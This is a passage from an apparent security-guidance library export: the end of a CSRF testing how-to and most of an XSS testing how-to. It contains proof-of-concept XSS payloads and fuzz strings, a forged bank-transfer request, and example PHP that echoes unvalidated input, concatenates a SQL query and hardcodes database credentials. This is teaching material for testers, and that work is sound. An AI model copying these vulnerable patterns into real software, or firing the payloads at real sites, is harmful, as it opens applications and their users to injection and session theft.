&lt;pre&gt;GET http://www.example.com/trasnfer?amount=1000&amp;amp;dest=1234 HTTP/1.1&lt;br&gt;Host: localhost&lt;br&gt;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14&lt;br&gt;Accept: text/xml,application/xml,application/xhtml&amp;#43;xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&lt;br&gt;Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3&lt;br&gt;Accept-Encoding: gzip,deflate&lt;br&gt;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7&lt;br&gt;Keep-Alive: 300&lt;br&gt;Proxy-Connection: keep-alive&lt;br&gt;Cookie: session-ID=1089eq14; secret=1240u9309u2efija&lt;strong&gt;XXXX&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Expected result:&amp;nbsp; The server must disallow the action since the secret was changed in step 6.&amp;nbsp; The test fails if the server allows the requested action.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Fine-tune Test Case Data&lt;/h1&gt;
&lt;p&gt;The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.&amp;nbsp; &amp;nbsp;Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Fine-tune Test Case Data per objective&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Attackers can use CSRF bugs to execute different kinds of attacks.&amp;nbsp; It is important that you test these different payloads depending the characteristics of your application. Common objectives of &amp;nbsp;CSRF attacks include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Making a fraudulent bank transaction. &lt;/li&gt;&lt;li&gt;Sending spoofed email. &lt;/li&gt;&lt;li&gt;Exploiting an administrative application. &lt;/li&gt;&lt;li&gt;Forcing password resets. &lt;/li&gt;&lt;li&gt;Changing router and firewall configurations [iii].&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Automate test cases &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.&amp;nbsp; Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Cross-Site Request Forgery is serious attack class that affects any web application that doesn’t explicitly protect against it.&amp;nbsp; Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.&amp;nbsp;&amp;nbsp;
 In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;[i] &lt;strong&gt;Cross-Site Request Forgery&lt;/strong&gt;.&amp;nbsp; Wikiepedia. &lt;a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery"&gt;
http://en.wikipedia.org/wiki/Cross-site_request_forgery&lt;/a&gt;&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;
&lt;p&gt;&lt;a href="about:blank#_ednref2" name="x__edn2"&gt;&lt;/a&gt;[ii] &lt;strong&gt;Session Riding -&amp;nbsp; A Widespread Vulnerability in Today Web Applications.
&lt;/strong&gt;Thomas Scheiber, SecureNet GmbH, Dec 2004. &lt;a href="http://www.securenet.de/papers/Session_Riding.pdf"&gt;
http://www.securenet.de/papers/Session_Riding.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5d5984a3-ca55-4303-86b3-745e06079f63</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Cross Site Scripting Vulnerabilities</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;XSS bugs affect applications that manipulate HTML input and output.&amp;nbsp; In particular web applications developed in ASP, ASP .NET, PHP, PERL, Java, and Visual Basic.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Cross site scripting (or XSS) is a well known HTML-related security vulnerability that commonly affects Internet clients through XSS vulnerable servers.&amp;nbsp; A XSS bug in a web server allows an attacker to send malicious payload to a victim browser such as IE,
 Firefox, or Netscape through the vulnerable server.&amp;nbsp; &amp;nbsp;Payloads may also execute in other HTTP clients not necessarily focused at browsing the web as long as they render HTML and execute any execute scripts.
&lt;/p&gt;
&lt;p&gt;Below is a summary of steps needed for testing for XSS bugs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;:&amp;nbsp; Understand XSS attack scenarios &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;:&amp;nbsp; List high risk components&lt;strong&gt; &lt;/strong&gt;and&lt;strong&gt;
&lt;/strong&gt;entry points &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;:&amp;nbsp; Start testing and exploring &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 4&lt;/strong&gt;:&amp;nbsp; Tune test case data&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Step1:&amp;nbsp; Understand XSS Attack Scenarios&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are two types of XSS: reflective and persistent.&amp;nbsp; A reflective XSS bug occurs when the web server takes input from a visitor and automatically sends him back the input without checking if the data inputted contains a script.&amp;nbsp; Thus, the input data is
&lt;em&gt;reflected&lt;/em&gt; to the visitor and executes at the visitor's browser.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;A persistent XSS bug is when a script embedded in malicious data is stored in a persistent store such as database, a file, or other storing mechanism.&amp;nbsp; The malicious data containing a script
&lt;em&gt;persists&lt;/em&gt; in the server.&amp;nbsp;&amp;nbsp; If the server application takes this stored content and sends it to the client without validating its contents, the script will be executed in the browser.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;It is important to understand both XSS attack scenarios to know what to look at when testing.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Reflective XSS through web search form scenario&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web site has a search page named search.php that contains the following form:&lt;/p&gt;
&lt;p&gt;&lt;img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image001.png"&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;form&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;input name=&amp;quot;searchInput&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;50&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;input name=&amp;quot;searchButton&amp;quot; type=&amp;quot;button&amp;quot; size=&amp;quot;20&amp;quot; value=&amp;quot;search&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/form&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;It collects input using the searchInput variable and shows the results in the same page:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;p&amp;gt; Search results for &amp;lt;?php echo $_GET['searchInput']?&amp;gt; are:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;The user can type test and will see:&lt;/p&gt;
&lt;p&gt;&lt;img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image003.png"&gt;&lt;/p&gt;
&lt;p&gt;An attacker can exploit the searchInput variable using the SCRIPT tag and type:&lt;/p&gt;
&lt;p&gt;&lt;img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image005.png"&gt;&lt;/p&gt;
&lt;p&gt;The server will send the user a page containing a SCRIPT tag and the user browser will execute its contents and display a message box with the word XSS.&amp;nbsp; An attacker can send an email to a victim and tell her to click the following URL:&lt;/p&gt;
&lt;p&gt;http://teammentorexample.com/search/search.php?searchInput=&amp;lt;SCRIPT&amp;gt;payload&amp;lt;/SCRIPT&amp;gt;&lt;/p&gt;
&lt;p&gt;When following the link, the malicious payload executes in the victim browser's context and can be used for stealing session or cookie information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Persistent XSS through a SQL database server&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web application creates a profile web page by querying a database table and getting profile information from it. The problem is that the database doesn't check for a possible script being stored in the database.&amp;nbsp; To display the user's favorite quote it
 uses the following PHP code:&lt;/p&gt;
&lt;p&gt;echo 'favorite quote:&amp;nbsp; &amp;lt;br&amp;gt;';&lt;/p&gt;
&lt;p&gt;$connection = odbc_connect(&amp;quot;sqldb&amp;quot;, &amp;quot;admin&amp;quot;, &amp;quot;root&amp;quot;);&lt;/p&gt;
&lt;p&gt;$query = &amp;quot;SELECT quote FROM ProfileTable WHERE UserName = &amp;quot; . &amp;nbsp;$_GET['user']&amp;quot;;
&lt;/p&gt;
&lt;p&gt;$result = odbc_exec($connection, $query);&lt;/p&gt;
&lt;p&gt;odbc_fetch_row($result);&lt;/p&gt;
&lt;p&gt;$quote = odbc_result($result, 1); &lt;/p&gt;
&lt;p&gt;print($quote);&lt;/p&gt;
&lt;p&gt;An attacker with a profile name of 'JohnB' connected to the database before and set this information in his profile as his favorite quote:&lt;/p&gt;
&lt;p&gt;&amp;lt;SCRIPT&amp;gt;alert('XSS') &amp;lt;/SCRIPT&amp;gt;&lt;/p&gt;
&lt;p&gt;Now, every time that anyone visits the their profile by following a link like this one will see the alert box:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;http://teammentorexample.com/showProfile.php?user=JohnB&lt;/p&gt;
&lt;p&gt;The attacker can modify the alert box with a more dangerous payload such as stealing session or cookie information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2: List High Risk Components and Entry Points&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Identify high risk components&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The next step in testing for XSS bugs is to do an extensive and careful revision of components that take input data from Internet clients and use send it back to the client.&amp;nbsp; In case of large web services, documentation such as design or architectural, if
 available, become real handy at this point. &amp;nbsp;&amp;nbsp;Testers need to think about what components reflect data to a web client (for reflective XSS) and store data which is later send to a web client (for persistent XSS).&amp;nbsp; Common components that do this include:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Search web pages&lt;/p&gt;
&lt;p&gt;Profile-related web pages&lt;/p&gt;
&lt;p&gt;Web forums&lt;/p&gt;
&lt;p&gt;Blogs&lt;/p&gt;
&lt;p&gt;RSS feeds&lt;/p&gt;
&lt;p&gt;HTML-based help browsers for thick clients&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Look for code that writes HTML responses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are many different scripting functions that append HTML to the server response.&amp;nbsp; Finding the server-side code that writes data out is the first step evaluating and finding potential XSS issues.&amp;nbsp; Here are some examples of functions that do that:&lt;/p&gt;
&lt;p&gt;Response.Write&amp;nbsp;&amp;nbsp;&amp;nbsp; (ASP)&lt;/p&gt;
&lt;p&gt;&amp;lt;%= %&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (ASP)&lt;/p&gt;
&lt;p&gt;echo&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/p&gt;
&lt;p&gt;print&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/p&gt;
&lt;p&gt;Functions to write data to a response vary depending on the language and platform you're testing.&amp;nbsp; Be certain that you understand all the relevant functions in the language you're using.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Check for non-validated and unencoded data in responses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Next, check what is being output by the mechanisms above.&amp;nbsp; For example, an application might do this:&lt;/p&gt;
&lt;p&gt;Response.Write(Request.QueryString(search))&lt;/p&gt;
&lt;p&gt;To write the contents of the search value in the URL.&amp;nbsp; If the variable is set to a script it will execute as soon as the client renders the page written.&lt;/p&gt;
&lt;p&gt;The following PHP code doesn't look so harmful at first.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;print($quote);&lt;/p&gt;
&lt;p&gt;However, if the quote variable is a string that directly comes from a database like in the persistent scenario above then it suffers of XSS.&lt;/p&gt;
&lt;p&gt;Look carefully at cases where the output data comes from a back-end though a database or a web method.&amp;nbsp; It might be that a web method returns non-validated data:&lt;/p&gt;
&lt;p&gt;Response.Write(ExternalApplication.GetRSSFeedMethod())&lt;/p&gt;
&lt;p&gt;Even if the data written out by an application comes directly from the user and has not been specifically validated for format, if it is appropriately encoded, it can still be safe.&amp;nbsp; That said, the encoding must take the form of a whitelist of known-safe
 characters (generally only the alphanumerics), not a blacklist as is commonly attempted.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Match high risk components with entry points&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Non-validated data comes from all of the application's entry points, not just the web.&amp;nbsp; Be certain to cover all the possible sources of malicious data which might get passed to a client.&amp;nbsp; Common data sources include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web forms &lt;/li&gt;&lt;li&gt;URL contents &lt;/li&gt;&lt;li&gt;Cookie contents &lt;/li&gt;&lt;li&gt;Flash parameters &lt;/li&gt;&lt;li&gt;SQL database query contents &lt;/li&gt;&lt;li&gt;Web service data &lt;/li&gt;&lt;li&gt;Graphical User Interface&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;List the high risk variables in the application and their data sources to make sure that they are covered during review and testing&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image007.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 3:&amp;nbsp; Start Test and Exploring&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;During this step testing is focused at submitting basic XSS fuzz strings and observing how the application reacts, and then trying to display a simple alert box that proves the existence of an XSS bug.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Start with a simple fuzz string&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Success in finding XSS bugs depends on whether the tester is able to store or reflect an HTML script in or through the server.&amp;nbsp; In almost all cases scripts are included in between SCRIPT tags (other tags also worked as explained later).&amp;nbsp; During this step,
 it is recommended to start exploring how the server application's high risk components react to tag related input.&amp;nbsp; A good idea is to start testing a simple fuzz string like this one:&lt;/p&gt;
&lt;p&gt;'&amp;gt;;!--&amp;quot;&amp;gt;&amp;lt;XYZ&amp;gt;&amp;lt;=&amp;amp;{()}&lt;/p&gt;
&lt;p&gt;Then look for the string XYZ in server's response to see how the server processed the special script related characters.&amp;nbsp; It might turn out that the server uses the string inside of a tag:&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line163"&gt;&lt;/a&gt;&amp;quot;'&amp;gt;;!--&amp;quot;&amp;gt;&amp;lt;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;gt;&amp;lt;=&amp;amp;{()}&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;Continue by modifying the initial string to try displaying an alert.&amp;nbsp; The double quotes of the original fuzz string closed the
&lt;em&gt;value&lt;/em&gt; property so whatever came before doesn't matter.&amp;nbsp; Also, after the closing parenthesis next to the letter Z the string can be anything.&amp;nbsp; Taking the string can be simplified to this:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;XYZ&amp;gt;&lt;/p&gt;
&lt;p&gt;The server might reply with:&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line1631"&gt;&lt;/a&gt;&amp;quot;&amp;quot;&amp;gt;&amp;lt;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;gt;&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;To learn more,&amp;nbsp;see the XSS Cheat Sheet at&amp;nbsp;Ha.ckers.com (&lt;a href="http://ha.ckers.org/xss.html"&gt;http://ha.ckers.org/xss.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Try to display an alert box&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following goal is to execute a script and the easiest script to test is the one shown in the first scenario that displays an alert box.&amp;nbsp; Note that now the tester knows that the malicious sting needs to start with the &amp;quot;&amp;gt; character, due to where in the
 HTML document it will appear:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;If the server doesn't filter the SCRIPT tags then an alert box will appear.&amp;nbsp; The code sent back to the tester will look like this.&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line16311"&gt;&lt;/a&gt;&amp;quot;&amp;quot;&amp;gt;&lt;span style="text-decoration:underline"&gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/span&gt;&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Cover different tags&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes severs filter out the string &amp;lt;script&amp;gt; from their output.&amp;nbsp; If the server doesn't allow script tags, try the img tag and put your code in the src property:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;javascript:alert('Works');&amp;quot;&amp;lt;/img&amp;gt;&lt;/p&gt;
&lt;p&gt;In fact, there are many other tags known to be dangerous in some cases, such as &amp;lt;iframe&amp;gt;, &amp;lt;body&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;meta&amp;gt;, &amp;lt;html&amp;gt;, &amp;lt;frame&amp;gt;, &amp;lt;frameset&amp;gt;, &amp;lt;input&amp;gt;, &amp;lt;layer&amp;gt;, &amp;lt;object&amp;gt;, and &amp;lt;style&amp;gt;.
&lt;/p&gt;
&lt;p&gt;A good choice is to try the following that doesn't require script tags or the JavaScript command:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;body onload=alert('Works')&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4:&amp;nbsp; Tune Test Case Data&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;During this step testing is focused at covering all entry points and tuning test case data based on the format of the specific entry point.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider string format and encoding according to entry point&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The example in step 3 doesn't specify how the fuzz string was passed to the application (it can be assumed that it was through a web form for these purposes). &amp;nbsp;During this step, testers need to go through their list of components and entry points and modify
 test case data according to the entry point.&amp;nbsp; Make sure that all entry points are covered.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Web Forms&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Web forms are the easiest to test since they commonly allow only ASCII strings.&amp;nbsp; To test through this entry point, just go through the high risk component list looking for ones that have web forms.&amp;nbsp; Then use a web browser to submit test strings to the components
 via the forms, and possibly an attack proxy like Burp Suite to circumvent any client-side JavaScript used for data validation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;URL Contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web application is vulnerable to XSS through the value passed in the password variable:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=[value]&amp;amp;password=[value]&lt;/p&gt;
&lt;p&gt;If testers want to test the following string in the password value:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;They will need to modify the above URL in this way:&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;When executing test cases through the URL it is important to try different encodings of the test string.&amp;nbsp;&amp;nbsp; For instance, one can execute the first attack string below and it causes no effect.&amp;nbsp; Then execute the second one and the alert box works.&amp;nbsp; In this
 case the web application didn't allow the symbol characters (except the round brackets) in ASCII but did in their hexadecimal encodings:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;javascript:alert('Works');&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;img%20src%3d%22javascript:alert(%27Works%27)%22&amp;gt;&lt;/p&gt;
&lt;p&gt;When testing through the URL and sometimes in other places, it is necessary to investigate what type of encodings the server is using and modify test cases according to them.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Cookie contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the application blindly displays the contents of a cookie in the web browser such as showed in the following PHP code:&lt;/p&gt;
&lt;p&gt;&amp;lt;?php&amp;nbsp; echo $_COOKIE[&amp;quot;testcookie&amp;quot;]; ?&amp;gt;&lt;/p&gt;
&lt;p&gt;To test the risky component through this entry point we have to modify the cookie file in disk and try to inject a simple script:&lt;/p&gt;
&lt;p&gt;&lt;img src="about:../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image009.png"&gt;&lt;/p&gt;
&lt;p&gt;Then restart the browser and navigate to the page containing the PHP code to see if an alert box appears.&amp;nbsp; Alternately, an attack proxy can be used to perform this modification on the fly, which is especially helpful in the case of complicated applications.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Flash Parameters&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Since Flash parameters are frequently passed in the URL, testing Flash parameters is similar to testing URL contents.&amp;nbsp; Here, it is necessary to go through each parameter in the URL and see how the application reacts.&amp;nbsp; Flash also frequently receives parameters
 using &lt;strong&gt;FlashVars&lt;/strong&gt;.&amp;nbsp; Consider the following code to load a Flash movie:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;codebase=&amp;quot;&amp;quot;http://macromedia.com/cabs/swflash.cab#version=6,0,0,0&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; id=&amp;quot;flaMovie1&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=movie value=&amp;quot;flaMovie1.swf&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=&lt;strong&gt;FlashVars&lt;/strong&gt; value=&lt;strong&gt;&amp;quot;inputURL=usersinput&amp;quot;&lt;/strong&gt;&amp;gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=quality value=high&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=bgcolor value=#ffffff&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;embed src=&amp;quot;flaMovie1.swf&amp;quot; &lt;strong&gt;FlashVars&lt;/strong&gt;=&lt;strong&gt;&amp;quot;inputURL=usersinput&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; name=&amp;quot;flaMovie1&amp;quot; align type=&amp;quot;application/x-shockwave-flash&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/object&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;During this step, testers will need to change the entry parameters to Flash like this:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;codebase=&amp;quot;&amp;quot;http://macromedia.com/cabs/swflash.cab#version=6,0,0,0&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; id=&amp;quot;flaMovie1&amp;quot; align=&amp;quot;CENTER&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=movie value=&amp;quot;flaMovie1.swf&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=&lt;strong&gt;FlashVars&lt;/strong&gt; value=&lt;strong&gt;&amp;quot;inputURL=%3cscript%3ealart%28%b4XSS%b4%29%3c%2fscript%3e&amp;quot;&lt;/strong&gt;&amp;gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=quality value=high&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;para name=bgcolor value=#ffffff&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;embed src=&amp;quot;flaMovie1.swf&amp;quot; &lt;strong&gt;FlashVars&lt;/strong&gt;=&lt;strong&gt;&amp;quot;inputURL=%3CSCRIPT%3Ealert%28%B4XSS%B4%29%3C%2FSCRIPT%3E&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
